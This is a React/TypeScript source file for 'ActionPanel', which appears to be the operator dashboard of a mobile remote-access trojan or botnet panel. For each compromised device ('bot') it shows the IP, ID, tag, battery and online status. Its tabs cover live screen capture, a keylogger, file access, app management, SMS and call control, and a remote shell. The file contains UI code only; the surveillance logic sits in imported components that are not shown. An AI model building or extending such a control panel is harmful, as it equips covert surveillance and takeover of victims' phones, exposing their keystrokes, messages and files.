import React, { useState } from 'react';
import type { Bot } from '../types';
import { LiveScreen } from './LiveScreen';
import { FileManager } from './FileManager';
import { Keylogger } from './Keylogger';
import { AppManager } from './AppManager';
import { Terminal } from './Terminal';
import { SMSManager } from './SMSManager';

interface ActionPanelProps {
  bot: Bot;
  onClose: () => void;
}

type TabType = 'screen' | 'files' | 'keylogger' | 'apps' | 'sms' | 'terminal';

export const ActionPanel: React.FC<ActionPanelProps> = ({ bot, onClose }) => {
  const [activeTab, setActiveTab] = useState<TabType>('screen');

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '16px', padding: '16px' }}>
      
      {/* Bot Info Header */}
      <div className="glass-panel" style={{ padding: '16px', display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '12px' }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
          {/* Back button for mobile viewports */}
          <button 
            className="btn btn-secondary mobile-back-btn" 
            onClick={onClose}
            style={{ 
              padding: '6px 10px', 
              fontSize: '12px', 
              minHeight: '32px'
            }}
          >
            ← Voltar
          </button>
          
          <span style={{ fontSize: '28px' }} className="device-flag">{bot.countryCode === 'BR' ? '🇧🇷' : '🇺🇸'}</span>
          <div>
            <h2 style={{ fontSize: '18px', fontWeight: '700', color: 'var(--text-primary)' }}>{bot.name}</h2>
            <div style={{ display: 'flex', gap: '10px', fontSize: '11px', color: 'var(--text-secondary)', marginTop: '2px', flexWrap: 'wrap' }}>
              <span>ID: <strong style={{ color: 'var(--accent-purple)' }}>{bot.id}</strong></span>
              <span>•</span>
              <span>IP: <strong>{bot.ip}</strong></span>
              <span>•</span>
              <span>Tag: <strong style={{ color: 'var(--accent-cyan)' }}>{bot.tag}</strong></span>
            </div>
          </div>
        </div>

        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-end', fontSize: '11px', color: 'var(--text-secondary)' }}>
            <span className={`badge ${bot.status === 'online' ? 'badge-online' : 'badge-offline'}`} style={{ padding: '1px 6px', fontSize: '9px' }}>
              {bot.status}
            </span>
            <span style={{ marginTop: '2px' }}>🔋 {bot.battery}% {bot.batteryCharging ? '⚡' : ''}</span>
          </div>
          <button className="btn btn-secondary desktop-close-btn" onClick={onClose} style={{ padding: '8px 12px', fontSize: '13px' }}>
            ✕ Fechar
          </button>
        </div>
      </div>

      {/* Tabs navigation bar */}
      <div 
        className="tabs-scroll" 
        style={{ 
          display: 'flex', 
          gap: '4px', 
          borderBottom: '1px solid var(--border-color)', 
          paddingBottom: '2px', 
          overflowX: 'auto',
          WebkitOverflowScrolling: 'touch'
        }}
      >
        {[
          { id: 'screen', label: '📺 Tela', color: 'var(--accent-purple)' },
          { id: 'keylogger', label: '⌨️ Keylogger', color: 'var(--accent-pink)' },
          { id: 'files', label: '📁 Arquivos', color: 'var(--accent-cyan)' },
          { id: 'apps', label: '📱 Apps', color: 'var(--success)' },
          { id: 'sms', label: '💬 SMS/Call', color: 'var(--warning)' },
          { id: 'terminal', label: '💻 Shell', color: 'white' }
        ].map(tab => {
          const isActive = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id as TabType)}
              style={{
                background: isActive ? 'var(--panel-hover)' : 'transparent',
                border: 'none',
                borderBottom: isActive ? `2px solid ${tab.color}` : '2px solid transparent',
                color: isActive ? 'white' : 'var(--text-secondary)',
                padding: '10px 14px',
                fontSize: '13px',
                fontWeight: '500',
                borderRadius: '6px 6px 0 0',
                cursor: 'pointer',
                whiteSpace: 'nowrap',
                transition: 'all 0.2s ease',
                minHeight: 'auto',
                flexShrink: 0
              }}
            >
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* Tab content renderer */}
      <div className="glass-panel" style={{ background: 'var(--bg-secondary)', minHeight: '400px', borderRadius: '0 0 12px 12px' }}>
        {activeTab === 'screen' && <LiveScreen bot={bot} />}
        {activeTab === 'files' && <FileManager bot={bot} />}
        {activeTab === 'keylogger' && <Keylogger bot={bot} />}
        {activeTab === 'apps' && <AppManager bot={bot} />}
        {activeTab === 'sms' && <SMSManager bot={bot} />}
        {activeTab === 'terminal' && <Terminal bot={bot} />}
      </div>

      <style>{`
        /* Hide scrollbars on tab lists */
        .tabs-scroll::-webkit-scrollbar {
          display: none;
        }
        .tabs-scroll {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
        
        /* Show/hide close buttons based on viewport */
        .mobile-back-btn { display: inline-flex !important; }
        .desktop-close-btn { display: none !important; }
        
        @media (min-width: 1024px) {
          .mobile-back-btn { display: none !important; }
          .desktop-close-btn { display: inline-flex !important; }
        }
      `}</style>
    </div>
  );
};
